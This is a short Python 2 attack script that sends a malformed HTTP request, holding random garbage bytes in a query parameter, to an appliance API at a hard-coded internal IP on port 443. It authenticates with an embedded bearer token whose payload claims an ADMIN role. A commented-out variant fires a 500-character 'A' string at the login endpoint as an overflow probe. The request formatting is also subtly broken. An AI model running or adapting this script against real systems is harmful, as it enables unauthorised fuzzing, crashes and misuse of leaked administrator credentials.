#!/usr/bin/python
# send a POST/ data to an ip address/port
import socket, sys
import random

def create_attack():
    buf = ''
    num = random.randrange(25,101)

    for i in range(num):
        alpha = random.randrange(7,127)
        buf += chr(alpha)

    x = "A"*500
    buffer = 'GET /api/v1/updates/mandatoryUpdateStatus?_dc='+buf
    #buffer = 'GET /api/v1/auth/login?username='+x+'\r\n'
    buffer += "HTTP/1.1\r\n"
    buffer += "Authorization: Bearer eyJraWQiOiJUQV9KV0siLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJUaHJlYXRBUk1PUiIsImF1ZCI6IlRBX1JFU1QiLCJleHAiOjE0NTUyMjE5OTAsImp0aSI6ImxKRmtHYm5yQlFQdzQ0aHVackdhRkEiLCJpYXQiOjE0NTUyMjAxOTAsIm5iZiI6MTQ1NTIyMDA3MCwic3ViIjoic21jZ3JlZ29yeUBpeGlhY29tLmNvbSIsInJvbGUiOiJBRE1JTiIsImFwaSI6ZmFsc2V9.ftqQvD_I7bOZFni6AxtjKvigMd7AncvqP4Qd8uf7pPVTYGnhzQWXNU6UFfABDoB4cTQESg0PCflkM3R5C-Jde9kfHQ4mk6_bP_o8bKWydfagJrkFTTe01ZCdc3Sv--hoJMMS37MjyPs6GQbLMDhwibz4rxENOaLibu6ITZvC8yC-uK-20bs6yN53tTyjmpxjFNree0AyK0AxcZZUbkYJRj1BDsbcFxBHeuf3zu8E-mlpXb0EXwVbqnZZefZ9-2r1DrZQIbUCH-NFbVdYPlt5GycvuyHZfL_cbghpuF-tpTmoR1jAwC-EeDtAHMPRw5obQOuN-m4BpTIdKwhFe8WMSA"
    buffer += "Connection: keep-alive\r\n\r\n"
    print buffer
    return buffer

def send_attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("10.218.207.183",443))
    sock.send(create_attack())
    sock.close()

send_attack()
